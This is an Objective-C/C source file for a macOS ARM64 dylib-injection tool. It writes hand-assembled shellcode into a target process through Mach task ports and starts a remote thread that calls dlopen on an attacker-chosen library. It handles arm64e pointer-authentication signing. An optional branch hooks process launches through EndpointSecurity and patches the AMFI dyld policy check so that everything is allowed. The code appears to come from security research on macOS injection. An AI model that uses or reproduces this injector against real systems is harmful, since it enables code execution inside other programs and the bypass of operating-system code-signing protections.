#import <EndpointSecurity/EndpointSecurity.h>
#import <Security/Security.h>
#include <dlfcn.h>
#if __arm64e__
#include <bsm/libbsm.h>
#include <ptrauth.h>
#endif

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr,
                                      mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_read(vm_map_t target_task,
                                  mach_vm_address_t address,
                                  mach_vm_size_t size, vm_offset_t *data,
                                  mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_write(vm_map_t target_task,
                                   mach_vm_address_t address, vm_offset_t data,
                                   mach_msg_type_number_t dataCnt);
extern kern_return_t mach_vm_protect(vm_map_t target_task,
                                     mach_vm_address_t address,
                                     mach_vm_size_t size, boolean_t set_maximum,
                                     vm_prot_t new_protection);

#define STACK_SIZE 65536
#define CODE_SIZE 400 // the size of the shellcode

#if __arm64e__
char code[] = "\xff\x83\x00\xd1" // sub sp, sp, #2
              "\xfd\x7b\x01\xa9" // stp x29, x30, [sp, #16]
              "\xfd\x43\x00\x91" // add x29, sp, #16
              "\xe0\x03\x00\x91" // mov x0, sp
              "\xe0\x03\x00\x91" // mov x0, sp
              "\xe1\x03\x1f\xaa" // mov x1, xzr
              "\xe3\x03\x1f\xaa" // mov x3, xzr
              "\x82\x01\x00\x10" // adr x2, #52
              "\xe2\x23\xc1\xda" // paciza x2
              "\x09\x01\x00\x10" // adr x9, #32
              "\x29\x01\x40\xf9" // dereference the pointer
              "\x20\x01\x3f\xd6" // call pthread_create_from_mach_thread
              "\x09\x00\x00\x10" // adr x9, #0
              "\x20\x01\x1f\xd6" // br x9
              "\xfd\x7b\x42\xa9" // ldp x29, x30, [sp, #0x20]
              "\xFF\xC3\x00\x91" // add sp, sp, #0x30
              "\xC0\x03\x5F\xD6" // ret
              "PTHRDCRT"

              "\x7f\x23\x03\xd5" // pacibsp
              "\xff\xc3\x00\xd1" // sub sp, sp, #0x30
              "\xfd\x7b\x02\xa9" // stp x29, x30, [sp, #0x20]
              "\xFD\x83\x00\x91" // add x29, sp, #0x20
              "\x21\x00\x80\xd2" // mov x1, #1
              "\xa0\x01\x00\x10" // adr x0, libliblib
              "\x09\x01\x00\x10" // adr x9, dlopen__
              "\x29\x01\x40\xf9" // ldr x9, [x9]
              "\x20\x01\x3f\xd6" // blr x9
              "\x00\x00\x80\xd2" // movz x0, 0
              "\xc9\x00\x00\x10" // mov x9, pthr_exit
              "\x29\x01\x40\xf9" // ldr x9, [x9]
              "\x20\x01\x3f\xd6" // blr x9
              "\xff\x0f\x5f\xd6" // retab
              "DLOPEN__"
              "PTHREXIT"

              // placeholder for dylib path to load
              "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
              "LIBLIBLIBLIBLIB"
              "\x00\x00\x00\x00";
#else
char code[] =
    "\xff\x83\x00\xd1" // sup sp, sp, #2
    "\xfd\x7b\x01\xa9" // stp x29, x30, [sp, #16]
    "\xfd\x43\x00\x91" // add x29, sp, #16
    "\xe0\x03\x00\x91" // mov x0, sp
    "\xe1\x03\x1f\xaa" // mov x1, xzr
    "\xa2\x00\x00\x10" // adr x2, _dopen
    "\xe3\x03\x1f\xaa" // mov x3, xzr
    "\x44\x01\x00\x58" // ldr x4, pthrcrt  => LOAD ADDRESS FROM PTHRCRT
    "\x80\x00\x3f\xd6" // ldr x4           => BRANCH TO
                       // pthread_create_from_mach_thread
    // _jmp:
    "\x00\x00\x00\x14" // b _jmp

    // _dopen:
    "\xa0\x01\x00\x10" // adr x0, dylib    => LOAD ADDRESS OF DYLIB INTO x0
    "\x21\x00\x80\xd2" // mov x1, #1       => RTLD_LAZY
    "\xe7\x00\x00\x58" // ldr x7, dlopen   => LOAD ADDRESS FROM dlopen
    "\xe0\x00\x3f\xd6" // ldr x6           => BRANCH TO dlopen
    "\xe8\x00\x00\x58" // ldr x8, pthrext  => LOAD ADDRESS OF pthread_exit
    "\x00\x00\x80\xd2" // movz x0, 0
    "\x00\x01\x3f\xd6" // blr x8           => BRANCH TO pthread_exit

    "PTHRDCRT" // placeholder for pthread_create_from_mach_thread address
    "DLOPEN__" // placeholder for dlopen address
    "PTHREXIT" // placeholder for pthread_exit address
    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
    "LIBLIBLIBLIBLIB" // placeholder for dylib path to load
    "\x00\x00\x00\x00";
#endif

#ifdef AMFI
// patch _amfi_dyld_check_policy_self to return 0x5f
// meaning everything is allowed
char patch[] = "\xe2\x0b\x80\xd2"  // mov x2, 0x5f
               "\x22\x00\x00\xf9"  // str x2, [x1]
               "\x00\x00\x80\xd2"  // mov x0, #0
               "\xc0\x03\x5f\xd6"; // ret

void inc_addr(vm_offset_t *addr) { *addr += (vm_offset_t)sizeof(vm_offset_t); }

uintptr_t rearrange_stack(task_t task, char *lib, uintptr_t sp) {
  kern_return_t kr;
  vm_offset_t orig_sp = (vm_offset_t)sp;
  vm_offset_t load;
  vm_offset_t argc;
  vm_offset_t argv;

  mach_msg_type_number_t count;
  if ((kr = mach_vm_read(task, (mach_vm_address_t)orig_sp,
                         (mach_vm_size_t)sizeof(vm_offset_t), &load, &count)) !=
      KERN_SUCCESS) {
    fprintf(stderr, "Error reading load address: %s\n", mach_error_string(kr));
    exit(1);
  }

  inc_addr(&orig_sp);

  if ((kr = mach_vm_read(task, (mach_vm_address_t)orig_sp,
                         (mach_vm_size_t)sizeof(vm_offset_t), &argc, &count)) !=
      KERN_SUCCESS) {
    fprintf(stderr, "Error reading argc address: %s\n", mach_error_string(kr));
    exit(1);
  }

  printf("* argc: %lu\n", *(unsigned long *)argc);

  /*inc_addr(&orig_sp);

  if ((kr = mach_vm_read(task, (mach_vm_address_t)orig_sp,
                         (mach_vm_size_t)sizeof(vm_offset_t), &argv, &count)) !=
      KERN_SUCCESS) {
    fprintf(stderr, "Error reading argc address: %s\n", mach_error_string(kr));
    exit(1);
  }

  printf("* s = %s\n", (char *)argv);*/

  return sp;
}

void inject(pid_t pid, char *library) {
  task_port_t task;
  kern_return_t kr;

  if ((kr = task_for_pid(mach_task_self(), pid, &task)) != KERN_SUCCESS) {
    fprintf(stderr, "Error obtaining task for pid: %s\n",
            mach_error_string(kr));
    exit(1);
  }

  thread_act_array_t threads;
  mach_msg_type_number_t count;
  if ((kr = task_threads(task, &threads, &count)) != KERN_SUCCESS) {
    fprintf(stderr, "Error enumerating threads: %s\n", mach_error_string(kr));
    exit(1);
  }

  if (count != 1) {
    fprintf(stderr, "Count of threads is not 1\n");
    exit(1);
  }

  arm_thread_state64_t state;
  count = ARM_THREAD_STATE64_COUNT;
  thread_state_flavor_t flavor = ARM_THREAD_STATE64;
  if ((kr = thread_get_state(*threads, flavor, (thread_state_t)&state,
                             &count)) != KERN_SUCCESS) {
    fprintf(stderr, "Error getting thread state: %s\n", mach_error_string(kr));
    exit(1);
  }

  if ((kr = thread_convert_thread_state(
           *threads, THREAD_CONVERT_THREAD_STATE_TO_SELF, flavor,
           (thread_state_t)&state, count, (thread_state_t)&state, &count)) !=
      KERN_SUCCESS) {
    fprintf(stderr, "Error converting thread: %s\n", mach_error_string(kr));
    exit(1);
  }
  uintptr_t sp =
      rearrange_stack(task, library, arm_thread_state64_get_sp(state));
  arm_thread_state64_set_sp(state, sp);
  /*patch_restrictions(task, arm_thread_state64_get_pc(state));
  ensure(thread_convert_thread_state(
             *threads, THREAD_CONVERT_THREAD_STATE_FROM_SELF, flavor,
             reinterpret_cast<thread_state_t>(&state), count,
             reinterpret_cast<thread_state_t>(&state), &count) ==
  KERN_SUCCESS); ensure(thread_set_state(*threads, flavor,
                          reinterpret_cast<thread_state_t>(&state),
                          count) == KERN_SUCCESS);*/
}
#endif

int main(int argc, char **argv) {
  if (argc != 3) {
#ifdef AMFI
    fprintf(stderr, "usage: ./binary /path/to/binary /path/to/dylib\n");
    fprintf(stderr, "example: ./binary "
                    "/System/Applications/Books.app/Contents/MacOS/Books "
                    "/tmp/xzy.dylib\n");
    exit(1);
#else
    fprintf(stderr, "usage:   ./binary PID /path/to/dylib\n");
    fprintf(stderr, "example: ./binary 1234 /tmp/xyz.dylib\n");
    exit(1);
#endif
  }

  char *lib = argv[2];

#ifdef AMFI
  char *process = argv[1];

  es_client_t *client = NULL;
  es_new_client(&client, ^(es_client_t *client, const es_message_t *message) {
    switch (message->event_type) {
    case ES_EVENT_TYPE_AUTH_EXEC: {
      const char *name = message->event.exec.target->executable->path.data;
      // check if we have the right process
      if (strcmp(name, process) == 0) {
        pid_t pid = audit_token_to_pid(message->process->audit_token);
        printf("* process %s (%d) spawned\n", name, pid);
        printf("* injecting into %s\n", name);
        inject(pid, lib);
      }
    }
      es_respond_auth_result(client, message, ES_AUTH_RESULT_ALLOW, false);
      break;
    default:
      false && "Unexpected event type";
    }
  });
  es_event_type_t events[] = {ES_EVENT_TYPE_AUTH_EXEC};
  es_subscribe(client, events, sizeof(events) / sizeof(*events));
  dispatch_main();
#endif

  pid_t pid;
  pid = atoi(argv[1]);

  task_t remoteTask;
  kern_return_t kr;

  kr = task_for_pid(mach_task_self(), pid, &remoteTask);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "failed to get task port for pid=%d, error=%s\n", pid,
            mach_error_string(kr));
    exit(1);
  }

  printf("* got task=%d for pid=%d\n", remoteTask, pid);

  mach_vm_address_t remoteStack = (vm_address_t)NULL;
  mach_vm_address_t remoteCode = (vm_address_t)NULL;

  kr =
      mach_vm_allocate(remoteTask, &remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);

  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "failed to allocate stack memory=%s\n",
            mach_error_string(kr));
    exit(1);
  } else {
    printf("* allocated stack at 0x%llx\n", remoteStack);
  }

  kr = mach_vm_allocate(remoteTask, &remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);

  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "failed to allocate stack memory=%s\n",
            mach_error_string(kr));
    exit(1);
  } else {
    printf("* allocated code at 0x%llx\n", remoteCode);
  }

  uint64_t addr_of_dlopen = (uint64_t)dlopen;
  uint64_t addr_of_pthread =
      (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
  uint64_t addr_of_pexit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");

#if __arm64e__
  addr_of_dlopen = (uint64_t)ptrauth_strip((void *)addr_of_dlopen,
                                           ptrauth_key_function_pointer);
  addr_of_pthread = (uint64_t)ptrauth_strip((void *)addr_of_pthread,
                                            ptrauth_key_function_pointer);
  addr_of_pexit = (uint64_t)ptrauth_strip((void *)addr_of_pexit,
                                          ptrauth_key_function_pointer);
#endif

  char *possible_patch_location = (code);
  for (int i = 0; i < 0x100; i++) {
    possible_patch_location++;

    if (memcmp(possible_patch_location, "PTHRDCRT", 8) == 0) {
      memcpy(possible_patch_location, &addr_of_pthread, sizeof(uint64_t));
      printf("* found pthread_create_from_mach_thread at 0x%llx\n",
             addr_of_pthread);
    }

    if (memcmp(possible_patch_location, "PTHREXIT", 8) == 0) {
      memcpy(possible_patch_location, &addr_of_pexit, sizeof(uint64_t));
      printf("* found pthread_exit at 0x%llx\n", addr_of_pexit);
    }

    if (memcmp(possible_patch_location, "DLOPEN__", 6) == 0) {
      memcpy(possible_patch_location, &addr_of_dlopen, sizeof(uint64_t));
      printf("* found dlopen at 0x%llx\n", addr_of_dlopen);
    }

    if (memcmp(possible_patch_location, "LIBLIBLIB", 9) == 0) {
      strcpy(possible_patch_location, lib);
    }
  }

  printf("* finished patching\n");

  kr = mach_vm_write(remoteTask, remoteCode, (vm_address_t)code, CODE_SIZE);

  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "failed to write code at 0x%llx; error=%s\n", remoteCode,
            mach_error_string(kr));
    exit(1);
  } else {
    printf("* written code at 0x%llx\n", remoteCode);
  }

  printf("* spawning thread\n");
  kr = vm_protect(remoteTask, remoteCode, CODE_SIZE, FALSE,
                  VM_PROT_READ | VM_PROT_EXECUTE);

  remoteStack += (STACK_SIZE / 2);

  task_flavor_t flavor = ARM_THREAD_STATE64;
  mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;

  arm_thread_state64_t state;

#if __arm64e__
  state.__opaque_pc = ptrauth_sign_unauthenticated(
      (void *)remoteCode, ptrauth_key_process_independent_data,
      ptrauth_string_discriminator("pc"));
  state.__opaque_sp = ptrauth_sign_unauthenticated(
      (void *)remoteStack, ptrauth_key_process_independent_data,
      ptrauth_string_discriminator("sp"));
  state.__opaque_lr = ptrauth_sign_unauthenticated(
      (void *)remoteStack, ptrauth_key_process_independent_data,
      ptrauth_string_discriminator("lr"));

#else
  state.__pc = (uintptr_t)remoteCode;
  state.__sp = (uintptr_t)remoteStack;
#endif

  thread_act_t thread;
  kr = thread_create_running(remoteTask, flavor, (thread_state_t)&state, count,
                             &thread);

  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "error spawning thread; error=%s\n", mach_error_string(kr));
    exit(1);
  } else {
    printf("* finished injecting into pid=%d with dylib=%s\n", pid, lib);
  }
}
